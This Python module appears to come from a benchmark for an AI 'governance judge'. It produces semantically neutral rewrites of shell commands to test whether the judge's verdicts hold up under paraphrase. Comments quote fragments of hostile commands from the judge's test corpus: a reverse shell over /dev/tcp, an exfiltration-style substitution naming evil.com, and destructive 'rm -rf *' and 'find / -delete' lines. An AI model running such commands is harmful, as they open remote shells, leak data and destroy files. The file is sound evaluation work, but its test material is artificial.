"""Semantically-neutral rewrites of a shell command, and the rule that makes each one neutral.

`PROTOCOL.md` §5 requires a judge's floor to be measured two ways — the same verdicts replayed, and
the same item **paraphrased**. `bench/governance_judge` measured the replay half (19/19 easy,
29/34 ambiguous) and never the other. arXiv 2608.22331 is why it matters: semantically-neutral
perturbation SDs run **11× to 58×** the rerun SDs, so a floor measured only by replay is the smaller
of the two numbers.

**Neutrality is the whole measurement, so every rewrite here is mechanical and its argument is
written beside it.** A rewrite whose meaning might have shifted does not measure a floor; it
measures a different item. `instrument_check` prints every (original, rewritten) pair for a person
to read before anything is spent — the perturbations are cheap and being wrong about one is not.

Deliberately NOT included: appending a justifying comment (`… # clean the build dir`). The shell
ignores it and the judge does not — that adds information rather than rewording, which is a
different experiment.
"""

from __future__ import annotations

import re
from collections.abc import Callable
from dataclasses import dataclass

_UNQUOTED_SPACE = re.compile(r"""(?<=[^\s])[ ](?=[^\s])""")
_BUNDLE = re.compile(r"(?<=\s)-([A-Za-z]{2,3})(?=\s|$)")

#: Utilities whose single-dash multi-letter options ARE bundles of short flags.
#:
#: The list is a allowlist and not a heuristic because the failure is silent and total: `find` takes
#: single-dash LONG options, so reversing what looks like a bundle turned
#: `find / -name '*.log' -type f -delete` into `find / -eman '*.log' -epyt f -eteled` — not a
#: paraphrase of the command, not a command at all. The instrument check caught it before a call was
#: made, which is the only reason this file has an allowlist instead of a result.
_BUNDLING = frozenset({"rm", "cp", "mv", "ls", "tar", "chmod", "chown", "grep", "du", "df", "ps"})
_PY_C = re.compile(r"""(?P<head>python3?\s+-c\s+)(?P<q>["'])(?P<body>.*)(?P=q)\s*$""")
_UNSAFE_TO_QUOTE = re.compile(r"""[*?\[\]$`"'\\]""")


@dataclass(frozen=True)
class Rewrite:
    """One neutral rewrite of one command, carrying why it is neutral."""

    kind: str
    before: str
    after: str
    why: str

    @property
    def applied(self) -> bool:
        return self.after != self.before


def _outside_quotes(command: str) -> list[tuple[int, int]]:
    """Spans of ``command`` that are not inside a single- or double-quoted run.

    Crude on purpose — it does not model shell quoting fully, it only finds regions no quote
    character has opened. Every rewrite below uses it to refuse to touch quoted text, so being
    conservative here costs applicability and never correctness.
    """
    spans: list[tuple[int, int]] = []
    start = 0
    quote: str | None = None
    for index, char in enumerate(command):
        if quote is None and char in "\"'":
            if index > start:
                spans.append((start, index))
            quote = char
        elif quote is not None and char == quote:
            quote = None
            start = index + 1
    if quote is None and start < len(command):
        spans.append((start, len(command)))
    return spans


def shell_spacing(command: str) -> Rewrite:
    """Double every single space that separates tokens OUTSIDE any quoted run.

    Neutral because the shell collapses runs of unquoted whitespace into one separator before the
    command ever exists. Quoted runs are skipped, where a space is data.
    """
    out = list(command)
    inserts: list[int] = []
    for lo, hi in _outside_quotes(command):
        for match in _UNQUOTED_SPACE.finditer(command, lo, hi):
            inserts.append(match.start())
    for position in reversed(inserts):
        out.insert(position, " ")
    return Rewrite(
        "shell_spacing", command, "".join(out),
        "the shell collapses unquoted whitespace runs to one separator",
    )


def flag_order(command: str) -> Rewrite:
    """Reverse the letters inside a bundled short-flag group: ``-rf`` becomes ``-fr``.

    Neutral because a bundle is a set: POSIX utilities parse ``-rf`` and ``-fr`` identically — but
    only for utilities that HAVE bundles. `find`, `java` and `mysql` take single-dash long options,
    where the same rewrite is not a paraphrase, and applied to `find -name` it produces `-eman`.
    So the utility must be in :data:`_BUNDLING`, and the group must be 2-3 letters.
    """
    head = command.strip().split(" ", 1)[0].rsplit("/", 1)[-1]
    if head not in _BUNDLING:
        return Rewrite("flag_order", command, command,
                       f"{head!r} is not known to take bundled short flags")

    def flip(match: re.Match[str]) -> str:
        return "-" + match.group(1)[::-1]

    spans = _outside_quotes(command)
    out = command
    for lo, hi in reversed(spans):
        out = out[:lo] + _BUNDLE.sub(flip, out[lo:hi]) + out[hi:]
    return Rewrite(
        "flag_order", command, out,
        "a short-flag bundle is a set; POSIX parses -rf and -fr the same",
    )


def py_quotes(command: str) -> Rewrite:
    """Swap the quote style of a ``python -c`` payload, and of the literals inside it.

    Neutral because Python's ``'x'`` and ``"x"`` are the same string object. Applied only when the
    payload contains exactly one of the two quote characters, so nothing has to be escaped and the
    swap cannot change what is quoted.
    """
    match = _PY_C.search(command)
    if not match:
        return Rewrite("py_quotes", command, command, "not a python -c payload")
    outer, body = match.group("q"), match.group("body")
    inner = "'" if outer == '"' else '"'
    if inner in body and outer in body:
        return Rewrite("py_quotes", command, command, "both quote styles present — not swappable")
    if inner not in body:
        return Rewrite("py_quotes", command, command, "no inner literal to swap")
    swapped = body.replace(inner, outer if outer not in body else inner)
    if outer in body:
        return Rewrite("py_quotes", command, command, "outer quote appears in the body")
    rebuilt = command[: match.start()] + match.group("head") + inner + swapped + inner
    return Rewrite(
        "py_quotes", command, rebuilt,
        "Python's 'x' and \"x\" are the same string; the outer shell quote swaps with them",
    )


def path_quote(command: str) -> Rewrite:
    """Wrap the final bare argument in double quotes.

    Neutral because quoting a literal word changes nothing the shell does with it — **unless** the
    word contains a glob, a variable, a substitution or a quote, where quoting suppresses the very
    expansion that gives the command its meaning. Those are refused rather than handled: the
    corpus's `rm -rf *` must not silently become `rm -rf "*"`, which is a different command.
    """
    parts = command.rstrip().rsplit(" ", 1)
    if len(parts) != 2 or not parts[1]:
        return Rewrite("path_quote", command, command, "no trailing argument")
    if _UNSAFE_TO_QUOTE.search(parts[1]):
        return Rewrite(
            "path_quote", command, command,
            "trailing argument contains a glob, variable, substitution or quote — quoting it "
            "would change what the command does",
        )
    return Rewrite(
        "path_quote", command, f'{parts[0]} "{parts[1]}"',
        "quoting a literal word changes nothing the shell does with it",
    )


#: The rewrites that are ACTUALLY applied.
#:
#: `path_quote` is deliberately absent. It is written above, it was run, its output was read, and
#: three of its rewrites changed the command rather than rewording it: `bash -i >& /dev/tcp/... 0>&1`
#: became `... "0>&1"`, turning a redirection operator into a literal argument, and a naive split
#: inside `$(...)` produced `tr -d "=).evil.com"`. "Quoting a literal word is neutral" is true and
#: identifying a literal word in arbitrary shell needs a real parser; a wrong one silently measures
#: the judge against a DIFFERENT command and reports it as a floor. Kept in the file, out of the
#: tuple, with the reason — the next person will have the same idea.
PERTURBATIONS: tuple[Callable[[str], Rewrite], ...] = (
    shell_spacing,
    flag_order,
    py_quotes,
)

REFUSED: tuple[Callable[[str], Rewrite], ...] = (path_quote,)


def rewrites(command: str) -> list[Rewrite]:
    """Every rewrite that actually changed the command."""
    return [r for r in (fn(command) for fn in PERTURBATIONS) if r.applied]


def instrument_check() -> None:
    """Print every pair, and the reason each refusal refused. Read this before spending."""
    import sys
    from pathlib import Path

    sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
    from bench.governance_judge.corpus import corpus as easy
    from bench.governance_judge.corpus_ambiguous import corpus as ambiguous

    for name, items in (("easy", easy()), ("ambiguous", ambiguous())):
        applied: dict[str, int] = {}
        print(f"\n{'=' * 100}\n{name}: {len(items)} items\n{'=' * 100}")
        for item in items:
            produced = rewrites(item.command)
            for rewrite in produced:
                applied[rewrite.kind] = applied.get(rewrite.kind, 0) + 1
            print(f"\n[{item.label:6s}] {item.id}\n  ORIGINAL  {item.command}")
            for rewrite in produced:
                print(f"  {rewrite.kind:13s} {rewrite.after}")
            if not produced:
                print("  (no neutral rewrite applies)")
        print(f"\n-- {name}: applied per kind: {applied}")
        print(f"-- items with at least one rewrite: "
              f"{sum(1 for i in items if rewrites(i.command))} of {len(items)}")


if __name__ == "__main__":
    instrument_check()
